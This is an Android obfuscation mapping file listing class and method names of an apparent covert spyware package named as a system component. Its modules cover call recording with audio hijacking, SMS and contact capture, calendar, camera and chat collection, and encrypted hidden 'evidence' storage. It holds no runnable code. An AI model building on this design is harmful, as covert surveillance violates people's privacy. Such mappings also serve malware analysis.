android.media.AmrInputStream -> android.media.AmrInputStream:
    31:32:void actualStart() -> al
    36:37:void actualStop() -> am
    41:41:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    46:46:void actualGo() -> ak
    55:92:int notification(com.android.syssetup.Sim) -> absolute
    23:23:int notification(java.lang.Object) -> absolute
com.android.syssetup.event.EventSms -> stt.K:
    java.lang.String number -> begin
    java.lang.String msg -> ao
    byte[] $ -> end
    38:41:void actualStart() -> al
    45:47:void actualStop() -> am
    52:68:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    74:74:void actualGo() -> ak
    102:109:int notification(com.android.syssetup.module.message.Sms) -> absolute
    113:122:boolean isInteresting(com.android.syssetup.module.message.Sms,java.lang.String,java.lang.String) -> absolute
    27:27:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.event.EventStandby -> stt.L:
    25:26:void actualStart() -> al
    30:32:void actualStop() -> am
    36:36:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    42:42:void actualGo() -> ak
    47:55:int notification(com.android.syssetup.Standby) -> absolute
    17:17:int notification(java.lang.Object) -> absolute
com.android.syssetup.event.EventTimer -> stt.M:
    boolean nextDailyIn -> cz
    long start -> cI
    long stop -> cJ
    long oneDayMs -> cK
    java.util.Date timestart -> cL
    java.util.Date timestop -> cM
    boolean needExitOnStop -> cA
    62:99:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    109:122:void actualStart() -> al
    130:181:boolean setDailyDelay(boolean) -> for
    185:215:void initialSetDelay() -> bA
    228:255:void actualGo() -> ak
    264:266:void actualStop() -> am
com.android.syssetup.event.FactoryEvent -> stt.N:
    byte[] $ -> end
    int $$ -> record
    21:122:com.android.syssetup.event.BaseEvent create(java.lang.String,java.lang.String) -> begin
    17:17:com.android.syssetup.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> case
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.event.NullEvent -> stt.O:
    12:12:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    20:20:void actualGo() -> ak
    27:27:void actualStart() -> al
    34:34:void actualStop() -> am
com.android.syssetup.evidence.EvDispatcher -> stt.P:
    com.android.syssetup.evidence.EvDispatcher singleton -> cN
    java.util.concurrent.LinkedBlockingQueue queue -> cO
    java.util.HashMap evidences -> cP
    boolean halt -> cQ
    java.io.File sdDir -> cR
    boolean running -> cS
    87:131:void processQueue() -> bB
    149:157:com.android.syssetup.evidence.EvDispatcher self() -> bC
    170:191:void run() -> run
    203:215:void send(com.android.syssetup.Packet) -> absolute
    224:227:void halt() -> bD
    230:230:boolean isRunning() -> isRunning
    245:252:boolean createEv(com.android.syssetup.Packet) -> and
    267:276:void atomicEv(com.android.syssetup.Packet) -> array
    284:288:void itemsEv(com.android.syssetup.Packet) -> asm
    298:309:boolean writeEv(com.android.syssetup.Packet) -> begin
    313:324:boolean appendEv(com.android.syssetup.Packet) -> case
    336:359:boolean closeEv(com.android.syssetup.Packet) -> const
com.android.syssetup.evidence.Evidence -> stt.Q:
    boolean firstSpace -> cT
    boolean enoughSpace -> cU
    java.util.Date timestamp -> cV
    java.lang.String fileName -> cW
    com.android.syssetup.file.AutoFile fconn -> cX
    com.android.syssetup.crypto.Encryption encryption -> cY
    com.android.syssetup.evidence.EvidenceCollector evidenceCollector -> cZ
    com.android.syssetup.evidence.EvidenceDescription evidenceDescription -> da
    com.android.syssetup.Device device -> db
    int typeEvidenceId -> dc
    int progressive -> dd
    byte[] aesKey -> bL
    byte[] encData -> de
    byte[] lastBlock -> df
    140:154:boolean enoughSpace() -> bE
    168:193:boolean close() -> bF
    204:204:boolean createEvidence(byte[]) -> of
    226:315:boolean createEvidence(byte[],int) -> destructor
    330:379:byte[] makeDescription(byte[],int) -> div
    390:390:boolean writeEvidence(byte[]) -> operator
    410:442:boolean writeEvidence$1cf967a0(byte[],int) -> do
    454:467:boolean writeEvidences(java.util.ArrayList) -> absolute
    476:515:boolean appendEvidence$1cf967a0(byte[],int) -> downto
    548:551:void atomicWriteOnce(java.util.ArrayList) -> and
    564:564:java.lang.String toString() -> toString
com.android.syssetup.evidence.EvidenceBuilder -> stt.R:
    boolean firstInfo -> dg
    int type -> type
    long unique -> dh
    com.android.syssetup.evidence.EvDispatcher disp -> di
    boolean hasData -> dj
    int E_DELIMITER -> dk
    byte[] $ -> end
    133:141:com.android.syssetup.Packet init(int) -> file
    148:150:void atomic(int,byte[],byte[]) -> absolute
    156:158:void atomic$709763c4(java.util.ArrayList) -> array
    168:177:void send(com.android.syssetup.Packet) -> absolute
    185:192:void write(byte[]) -> write
    196:210:void write(java.util.ArrayList) -> asm
    213:270:void write(java.io.DataInputStream,int) -> absolute
    276:280:void close() -> close
    284:290:void immediateClose() -> bG
    293:293:boolean hasData() -> bH
    308:320:void info(java.lang.String) -> info
    324:336:void infoStart() -> bI
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.evidence.EvidenceCollector -> stt.S:
    java.lang.String LOG_EXTENSION -> dl
    java.lang.String PROG_FILENAME -> dm
    java.lang.String LOG_TMP -> dn
    com.android.syssetup.evidence.EvidenceCollector singleton -> dp
    java.lang.Object evidenceCollectorLock -> dq
    java.lang.String prefix -> dr
    java.util.Vector logVector -> ds
    int logProgressive -> dt
    byte[] $ -> end
    73:81:com.android.syssetup.evidence.EvidenceCollector self() -> bJ
    92:92:java.lang.String decryptName(java.lang.String) -> oh
    103:104:java.lang.String encryptName(java.lang.String) -> oi
    153:170:int deserializeProgressive() -> bK
    179:198:int getNewProgressive() -> bL
    209:216:java.lang.String makeDateName(java.util.Date) -> absolute
    229:266:com.android.syssetup.evidence.Name makeNewName(com.android.syssetup.evidence.Evidence,java.lang.String) -> absolute
    277:279:void remove(java.lang.String) -> remove
    289:290:int removeHidden() -> bM
    303:341:int removeRecursive(java.io.File,int) -> absolute
    358:387:java.util.Vector scanForDirLogs(java.lang.String) -> oj
    410:459:java.lang.String[] scanForEvidences(java.lang.String,java.lang.String) -> const
    463:469:boolean notVeryOld(java.io.File,java.lang.String) -> and
    476:520:void flushEvidences() -> bN
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.evidence.EvidenceDescription -> stt.T:
    int version -> version
    int logType -> du
    int hTimeStamp -> dv
    int lTimeStamp -> dw
    int deviceIdLen -> dx
    int userIdLen -> dy
    int sourceIdLen -> dz
    int additionalData -> dA
    int length -> length
    55:60:byte[] getBytes() -> getBytes
    72:83:void serialize$49634b87(byte[]) -> or
com.android.syssetup.evidence.Markup -> stt.U:
    byte markupSeed -> dB
    boolean markupInit -> dC
    java.lang.String markupId -> dD
    com.android.syssetup.crypto.Encryption encryption -> cY
    120:143:java.lang.String makeMarkupName$185c6b75(java.lang.String) -> ok
    147:152:int getMarkupSeed() -> bO
    186:192:boolean isMarkup() -> bP
    212:249:byte[] readMarkup() -> bQ
    270:277:void removeMarkup() -> bR
    293:315:boolean writeMarkup(byte[]) -> packed
    319:323:boolean writeMarkupSerializable(java.io.Serializable) -> absolute
    327:341:java.lang.Object readMarkupSerializable() -> bS
    347:372:java.io.Serializable unserialize(java.io.Serializable) -> and
    378:384:void serialize(java.io.Serializable) -> array
com.android.syssetup.evidence.Name -> stt.V:
    int progressive -> dd
    java.lang.String basePath -> dE
    java.lang.String blockDir -> dF
    java.lang.String encName -> dG
    java.lang.String fileName -> cW
com.android.syssetup.file.AutoFile -> stt.W:
    java.io.File file -> file
    java.lang.String filename -> filename
    71:71:byte[] read() -> bT
    82:113:java.lang.String getFileContents(java.lang.String) -> ol
    123:163:byte[] read(int,int) -> array
    174:214:byte[] read(int) -> for
    224:225:void write(byte[]) -> write
    240:264:boolean write$1cf927cf$49634b8b(byte[]) -> procedure
    270:271:void write(int) -> write
    280:325:boolean append(byte[]) -> program
    334:334:boolean exists() -> exists
    343:343:boolean canRead() -> canRead
    352:352:boolean isDirectory() -> isDirectory
    364:364:java.lang.String[] list() -> list
    373:373:long getSize() -> getSize
    382:382:java.util.Date getFileTime() -> bU
    386:386:java.lang.String getFilename() -> bV
    390:390:java.lang.String getName() -> getName
    397:405:boolean delete() -> delete
    409:418:boolean dropExtension(java.lang.String) -> om
    422:426:void create() -> create
    438:460:boolean rename(java.lang.String) -> on
    464:464:java.lang.String toString() -> toString
    468:468:long lastModified() -> lastModified
    472:481:void chmod(java.lang.String) -> oo
    485:485:java.io.File getFile() -> bW
com.android.syssetup.file.Directory -> stt.X:
    java.lang.String hiddenDirMacro -> dH
    java.lang.String userProfile -> dI
    java.lang.String userDoc -> dJ
    java.lang.String userPicture -> dK
    byte[] $ -> end
    36:40:java.lang.String expandMacro(java.lang.String) -> op
    44:48:java.lang.String expandMacro(java.lang.String,java.lang.String,java.lang.String) -> and
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.file.Path -> stt.Y:
    java.lang.String CONF_DIR -> dL
    java.lang.String MARKUP_DIR -> dM
    java.lang.String LOG_DIR -> dN
    java.lang.String UPLOADS -> dO
    java.lang.String hidden -> dP
    byte[] $ -> end
    int $$ -> record
    80:124:boolean makeDirs(boolean) -> function
    133:164:void setStorage(boolean) -> goto
    167:167:java.lang.String home() -> bX
    176:176:java.lang.String hidden() -> bY
    180:180:java.lang.String doc() -> bZ
    184:184:java.lang.String picture() -> ca
    204:204:java.lang.String conf() -> cb
    213:213:java.lang.String markup() -> cc
    222:222:java.lang.String logs() -> cd
    226:227:java.lang.String uploads() -> ce
    232:232:boolean unprotect(java.lang.String) -> oq
    237:254:boolean unprotect(java.lang.String,int,boolean) -> and
    258:289:boolean unprotect(java.lang.String,boolean) -> absolute
    293:297:boolean unprotect$3b99f9ef(java.lang.String,java.lang.String) -> constructor
    301:309:boolean unprotectAll$505cbf47(java.lang.String) -> os
    316:324:boolean lock(java.lang.String) -> ot
    335:336:boolean removeDirectory(java.lang.String) -> ou
    346:348:boolean createDirectory(java.lang.String) -> ov
    359:373:long freeSpace() -> cf
    385:391:boolean makeDirs() -> cg
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.interfaces.AbstractFactory -> stt.Z:
    com.android.syssetup.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> case
com.android.syssetup.interfaces.IncrementalLog -> stt.aa:
    void resetLog() -> ch
com.android.syssetup.interfaces.Observer -> stt.ab:
    int notification(java.lang.Object) -> absolute
com.android.syssetup.interfaces.iProtocol -> stt.ac:
    boolean init(com.android.syssetup.action.sync.Transport) -> absolute
    boolean perform() -> aN
com.android.syssetup.listener.AdR -> com.android.syssetup.listener.AdR:
    17:23:void onEnabled(android.content.Context,android.content.Intent) -> onEnabled
    28:33:void onDisabled(android.content.Context,android.content.Intent) -> onDisabled
    37:41:void onPasswordChanged(android.content.Context,android.content.Intent) -> onPasswordChanged
    45:49:void onPasswordFailed(android.content.Context,android.content.Intent) -> onPasswordFailed
    53:57:void onPasswordSucceeded(android.content.Context,android.content.Intent) -> onPasswordSucceeded
    62:69:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.listener.BAc -> stt.ad:
    byte[] $ -> end
    32:47:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.BC -> stt.ae:
    com.android.syssetup.Call call -> dQ
    byte[] $ -> end
    38:63:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    67:164:void manageReceive$3b2d1350(android.content.Intent) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.BSm -> stt.af:
    35:123:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    129:139:void memorize(java.lang.String,java.lang.String) -> destructor
    145:147:void cleanMemory() -> ci
com.android.syssetup.listener.BSm$1 -> stt.ag:
    com.android.syssetup.module.message.Sms val$sms -> dR
    com.android.syssetup.listener.BSm this$0 -> dS
    112:117:void run() -> run
com.android.syssetup.listener.BSt -> stt.ah:
    byte[] $ -> end
    32:46:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.BroadcastMonitorConnectivity -> stt.ai:
    boolean stop -> az
    int period -> dT
    41:71:void run() -> run
    75:76:void onReceive(boolean) -> if
    79:80:void register() -> cj
    83:85:void unregister() -> unregister
com.android.syssetup.listener.BroadcastMonitorSim -> stt.aj:
    boolean stop -> az
    int period -> dT
    35:53:void run() -> run
    57:58:void onReceive(java.lang.String) -> ow
    61:62:void register() -> cj
    65:67:void unregister() -> unregister
com.android.syssetup.listener.Listener -> stt.ak:
    java.util.ArrayList observers$7865b31 -> dU
    boolean suspended -> ag
    java.lang.Object suspendLock -> dV
    38:54:boolean attach(com.android.syssetup.interfaces.Observer) -> absolute
    58:77:void detach(com.android.syssetup.interfaces.Observer) -> and
    88:101:int dispatch(java.lang.Object) -> and
    108:117:void suspend() -> suspend
    124:133:void resume() -> resume
    146:148:void setSuspended(boolean) -> implementation
    void start() -> start
    void stop() -> stop
com.android.syssetup.listener.ListenerAc -> stt.al:
    com.android.syssetup.listener.BAc acReceiver -> dW
    com.android.syssetup.listener.ListenerAc singleton -> dX
    byte[] $ -> end
    33:41:com.android.syssetup.listener.ListenerAc self() -> ck
    46:47:void start() -> start
    51:52:void stop() -> stop
    58:67:void registerAc() -> cl
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.ListenerBattery -> stt.am:
    com.android.syssetup.listener.ListenerBattery$1 batteryReceiver$48665ecd -> dY
    com.android.syssetup.listener.ListenerBattery singleton -> dZ
    byte[] $ -> end
    38:46:com.android.syssetup.listener.ListenerBattery self() -> cm
    51:81:void start() -> start
    85:86:void stop() -> stop
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.ListenerBattery$1 -> stt.an:
    int scale -> and
    int level -> level
    int voltage -> asm
    int temp -> ea
    com.android.syssetup.listener.ListenerBattery this$0 -> eb
    byte[] $ -> end
    59:72:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $$24d420ae() -> until
com.android.syssetup.listener.ListenerCall -> stt.ao:
    com.android.syssetup.listener.BC callReceiver -> ec
    com.android.syssetup.listener.ListenerCall singleton -> ed
    29:37:com.android.syssetup.listener.ListenerCall self() -> cn
    42:43:void start() -> start
    48:48:void stop() -> stop
    54:55:void registerCall() -> co
    59:59:int dispatch(com.android.syssetup.Call) -> and
    14:14:int dispatch(java.lang.Object) -> and
com.android.syssetup.listener.ListenerConnectivity -> stt.ap:
    com.android.syssetup.listener.BroadcastMonitorConnectivity connectivityReceiver -> ee
    com.android.syssetup.listener.ListenerConnectivity singleton -> ef
    29:37:com.android.syssetup.listener.ListenerConnectivity self() -> cp
    42:43:void start() -> start
    47:48:void stop() -> stop
    54:57:void registerConnectivity() -> cq
com.android.syssetup.listener.ListenerProcess -> stt.aq:
    java.lang.String lastForeground -> eg
    boolean started -> started
    com.android.syssetup.listener.ListenerProcess$BroadcastMonitorProcess bmp -> eh
    java.lang.Object standbyLock -> ei
    java.lang.Object startedLock -> ej
    com.android.syssetup.listener.ListenerProcess singleton -> ek
    java.util.concurrent.ScheduledFuture future -> el
    java.util.concurrent.ScheduledExecutorService stpe -> em
    49:57:com.android.syssetup.listener.ListenerProcess self() -> cr
    72:93:void start() -> start
    99:117:void stop() -> stop
    127:141:int dispatch(java.lang.String) -> ox
    147:163:int notification(com.android.syssetup.Standby) -> absolute
    25:25:int notification(java.lang.Object) -> absolute
com.android.syssetup.listener.ListenerProcess$BroadcastMonitorProcess -> stt.aq$absolute:
    com.android.syssetup.listener.ListenerProcess this$0 -> en
    177:182:void run() -> run
com.android.syssetup.listener.ListenerSim -> stt.ar:
    com.android.syssetup.listener.BroadcastMonitorSim simReceiver -> eo
    com.android.syssetup.listener.ListenerSim singleton -> ep
    29:37:com.android.syssetup.listener.ListenerSim self() -> cs
    42:43:void start() -> start
    47:48:void stop() -> stop
    54:57:void registerSim() -> ct
com.android.syssetup.listener.ListenerSms -> stt.as:
    com.android.syssetup.listener.BSm smsReceiver -> eq
    com.android.syssetup.listener.ListenerSms singleton -> er
    29:37:com.android.syssetup.listener.ListenerSms self() -> cu
    42:43:void start() -> start
    48:48:void stop() -> stop
    54:55:void registerSms() -> cv
com.android.syssetup.listener.ListenerStandby -> stt.at:
    com.android.syssetup.listener.BSt standbyReceiver -> es
    com.android.syssetup.listener.ListenerStandby singleton -> et
    byte[] $ -> end
    35:43:com.android.syssetup.listener.ListenerStandby self() -> cw
    48:49:void start() -> start
    53:54:void stop() -> stop
    60:70:void registerAc() -> cl
    73:75:boolean isScreenOn() -> isScreenOn
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.WR -> stt.au:
    byte[] $ -> end
    19:67:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.manager.Manager -> stt.av:
    java.util.HashMap instances -> eu
    java.util.HashMap threads -> ev
    com.android.syssetup.Status status -> ax
    com.android.syssetup.interfaces.AbstractFactory factory -> ew
    50:51:void setFactory(com.android.syssetup.interfaces.AbstractFactory) -> absolute
    54:54:com.android.syssetup.ThreadBase get$1c213d36(java.lang.String) -> oy
com.android.syssetup.manager.ManagerEvent -> stt.aw:
    com.android.syssetup.manager.ManagerEvent singleton -> ex
    byte[] $ -> end
    36:45:com.android.syssetup.manager.ManagerEvent self() -> cx
    58:92:com.android.syssetup.event.BaseEvent createEvent(java.lang.String,com.android.syssetup.conf.ConfEvent) -> absolute
    102:127:boolean startAll() -> cy
    135:157:void stopAll() -> nil
    161:190:void start(java.lang.Integer) -> absolute
    194:245:void stop(java.lang.Integer) -> and
    248:256:void enable(int) -> function
    259:267:void disable(int) -> goto
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.manager.ManagerModule -> stt.ax:
    com.android.syssetup.manager.ManagerModule singleton -> ey
    39:48:com.android.syssetup.manager.ManagerModule self() -> cz
    97:120:void stopAll() -> nil
    129:180:void start(java.lang.String,com.android.syssetup.Trigger) -> absolute
    183:199:com.android.syssetup.module.BaseModule makeAgent(java.lang.String) -> oz
    207:207:boolean isInstancedAgent(java.lang.Class) -> absolute
    211:211:com.android.syssetup.module.BaseModule getInstancedAgent(java.lang.Class) -> and
    222:256:void stop(java.lang.String) -> oA
    265:272:void resetIncrementalLogs() -> cA
    281:282:java.lang.String getType(java.lang.Class) -> array
com.android.syssetup.module.BaseInstantModule -> stt.ay:
    11:27:void run() -> run
    32:32:void actualGo() -> ak
    37:37:void actualStop() -> am
com.android.syssetup.module.BaseModule -> stt.az:
    com.android.syssetup.conf.ChildConf conf$546a63e5 -> ez
    com.android.syssetup.Trigger trigger -> eA
    boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    37:37:java.lang.String getType() -> getType
    44:45:boolean setConf$239843e2(com.android.syssetup.conf.ChildConf) -> array
    50:50:java.lang.String toString() -> toString
    54:55:void setTrigger(com.android.syssetup.Trigger) -> and
    62:62:void notifyProcess(com.android.syssetup.ProcessInfo) -> and
com.android.syssetup.module.FactoryModule -> stt.aA:
    java.util.Hashtable factorymap -> eB
    java.util.Hashtable typemap -> eC
    byte[] $ -> end
    int $$ -> record
    54:57:java.lang.String getType(java.lang.Class) -> array
    73:89:com.android.syssetup.module.BaseModule create$33cff88d(java.lang.String) -> oB
    20:20:com.android.syssetup.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> case
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleAddressBook -> stt.aB:
    com.android.syssetup.module.task.PickContact contact -> eD
    com.android.syssetup.evidence.Markup markupContacts -> eE
    java.util.HashMap contacts -> eF
    java.lang.String observe -> eG
    java.lang.String myPhone -> eH
    byte[] $ -> end
    67:67:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    76:113:void actualStart() -> al
    126:167:void actualGo() -> ak
    171:172:void actualStop() -> am
    187:200:void serializeContacts() -> cB
    203:240:boolean contacts() -> cC
    245:258:boolean serializeIfNew(long,byte[]) -> absolute
    268:284:byte[] preparePacket(com.android.syssetup.module.task.Contact) -> absolute
    291:310:byte[] preparePacket(int,long,java.lang.String,java.lang.String,java.lang.String) -> absolute
    314:333:java.io.ByteArrayOutputStream prepareHeader(long,int,int) -> absolute
    337:356:void addTypedString(java.io.ByteArrayOutputStream,byte,java.lang.String) -> absolute
    360:375:int notification$2be0cc0f() -> cD
    379:380:void createEvidenceLocal(int,java.lang.String) -> and
    388:405:void createEvidenceLocal(int,java.lang.String,java.lang.String) -> absolute
    409:422:boolean createEvidenceRemote(int,com.android.syssetup.module.chat.Contact) -> absolute
    426:426:com.android.syssetup.module.ModuleAddressBook getInstance() -> cE
    36:36:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleAddressBook$1 -> stt.aC:
    com.android.syssetup.module.ModuleAddressBook this$0 -> eI
    135:145:long cursor(android.database.Cursor) -> absolute
com.android.syssetup.module.ModuleApplication -> stt.aD:
    com.android.syssetup.evidence.EvidenceBuilder evidenceIncremental -> eJ
    34:34:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    40:40:void actualGo() -> ak
    47:49:void actualStart() -> al
    53:56:void actualStop() -> am
    59:60:int notification(com.android.syssetup.ProcessInfo) -> absolute
    74:92:void saveEvidence(java.lang.String,com.android.syssetup.ProcessStatus) -> absolute
    103:107:void resetLog() -> ch
    29:29:int notification(java.lang.Object) -> absolute
com.android.syssetup.module.ModuleCalendar -> stt.aE:
    com.android.syssetup.evidence.Markup markupCalendar -> eK
    java.util.HashMap calendar -> eL
    byte[] $ -> end
    int $$ -> record
    55:55:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    64:90:void actualStart() -> al
    94:103:int notification(com.android.syssetup.ProcessInfo) -> absolute
    108:109:void actualStop() -> am
    122:134:void actualGo() -> ak
    146:159:void serializeCalendar() -> cF
    173:287:boolean calendar() -> cG
    296:324:java.util.Hashtable selectCalendars(java.lang.String) -> oC
    330:335:android.database.Cursor managedQuery$5eb44419(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String) -> absolute
    346:350:void saveEvidenceCalendar$487efef6(byte[]) -> record
    354:427:byte[] preparePacket(long,java.lang.String,java.lang.String,java.lang.String,java.util.Date,java.util.Date,java.lang.String,java.lang.Boolean) -> absolute
    431:438:void appendCalendarString(java.io.ByteArrayOutputStream,int,java.lang.String) -> absolute
    32:32:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall -> stt.aF:
    boolean recordFlag -> eM
    com.android.syssetup.module.ModuleCall$1 observer$5714f4ea -> eN
    java.lang.Thread queueMonitor -> eO
    java.lang.Object sync -> eP
    java.util.concurrent.LinkedBlockingQueue calls$19f590b5 -> eQ
    com.android.syssetup.module.call.EncodingTask encodingTask -> eR
    com.android.syssetup.util.CallBack hjcb -> eS
    com.android.syssetup.util.Instrument hijack -> eT
    byte[] AMR_HEADER -> eU
    int[] amr_sizes -> eV
    com.android.syssetup.RunningProcesses runningProcesses -> eW
    com.android.syssetup.module.call.CallInfo callInfo -> eX
    java.util.ArrayList chunks$7865b31 -> eY
    boolean[] finished -> eZ
    boolean canRecord -> fa
    boolean isStarted -> fb
    java.lang.Object recordingLock -> fc
    boolean started -> started
    byte[] $ -> end
    int $$ -> record
    102:102:com.android.syssetup.module.ModuleCall self() -> cH
    107:119:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    125:125:void actualGo() -> ak
    129:189:void actualStart() -> al
    193:216:boolean installedWhitelist() -> cI
    222:243:void actualStop() -> am
    246:299:void startWatchAudio() -> cJ
    301:301:boolean isMicAvailable() -> cK
    306:333:boolean installHijack() -> cL
    338:371:void purgeAudio() -> cM
    375:395:void scrubAudio() -> cN
    399:421:boolean addToEncodingList(java.lang.String) -> oD
    434:467:int notification(com.android.syssetup.Call) -> absolute
    478:521:boolean saveCallEvidence(java.lang.String,java.lang.String,boolean,java.util.Date,java.util.Date,java.lang.String,boolean,int,int) -> absolute
    527:535:void closeCallEvidence$66c2d4f6(java.lang.String,java.lang.String,java.util.Date,java.util.Date,int) -> absolute
    538:553:int checkIntegrity(byte[]) -> reintroduce
    569:608:byte[] getCallAdditionalData(java.lang.String,java.lang.String,boolean,com.android.syssetup.util.DateTime,com.android.syssetup.util.DateTime,int,int) -> absolute
    617:650:void saveCalllistEvidence$4b0c3ab0(java.lang.String,java.lang.String,boolean,java.util.Date,int) -> absolute
    679:829:void encodeChunks(com.android.syssetup.file.AutoFile) -> array
    834:840:long getStreamId(java.lang.String) -> oE
    846:854:int getStreamPid(java.lang.String) -> oF
    858:863:void sort_chunks() -> cO
    866:868:void saveCallEvidence(java.lang.String,java.lang.String,com.android.syssetup.module.call.Chunk,int) -> absolute
    875:893:void saveAllEvidences$2d9f8692(java.util.ArrayList,com.android.syssetup.module.call.CallInfo,java.util.Date,java.util.Date) -> absolute
    910:910:boolean canRecord() -> cP
    914:914:boolean isBooted() -> cQ
    60:60:int notification(java.lang.Object) -> absolute
    60:60:boolean access$000(com.android.syssetup.module.ModuleCall,java.lang.String) -> absolute
    60:60:com.android.syssetup.module.call.EncodingTask access$100(com.android.syssetup.module.ModuleCall) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall$1 -> stt.aG:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    277:295:void onEvent(int,java.lang.String) -> onEvent
com.android.syssetup.module.ModuleCall$2 -> stt.aH:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    byte[] $ -> end
    342:342:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall$3 -> stt.aI:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    byte[] $ -> end
    379:379:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall$4 -> stt.aJ:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    860:860:int compare(com.android.syssetup.module.call.Chunk,com.android.syssetup.module.call.Chunk) -> absolute
    858:858:int compare(java.lang.Object,java.lang.Object) -> compare
com.android.syssetup.module.ModuleCall$HC -> stt.aF$absolute:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    94:124:byte[] inputStreamToBuffer$4dfd4f08(java.io.InputStream) -> absolute
    145:171:boolean equals$5c8eef72(byte[],byte[],int) -> absolute
    207:220:int byteArrayToInt(byte[],int) -> else
    228:241:long byteArrayToLong$49634b7b(byte[]) -> repeat
    252:256:byte[] intToByteArray(int) -> if
    267:271:byte[] longToByteArray(long) -> begin
    282:282:java.lang.String byteArrayToHex(byte[]) -> self
    298:311:java.lang.String byteArrayToHex$55a39fc4(byte[],int) -> end
    315:321:byte[] hexStringToByteArray(java.lang.String) -> oG
    327:332:byte[] hexStringToByteArray$52f4461e(java.lang.String,int) -> array
    351:355:byte[] concat(byte[],int,byte[],int) -> absolute
    385:387:byte[] copy(byte[],int,int) -> and
    414:419:byte[] padByteArray$1cf9d9ca(byte[]) -> set
com.android.syssetup.module.ModuleCamera -> stt.aK:
    int counter -> fe
    51:51:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    65:72:void actualStart() -> al
    85:100:void snapshot() -> cR
    106:107:void callback(byte[]) -> shl
com.android.syssetup.module.ModuleChat -> stt.aL:
    com.android.syssetup.module.SubModuleManager subModuleManager -> ff
    56:65:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    71:72:void actualGo() -> ak
    81:83:void actualStart() -> al
    90:92:void actualStop() -> am
    99:129:void saveEvidence(java.util.ArrayList) -> begin
    136:136:int notification(com.android.syssetup.ProcessInfo) -> absolute
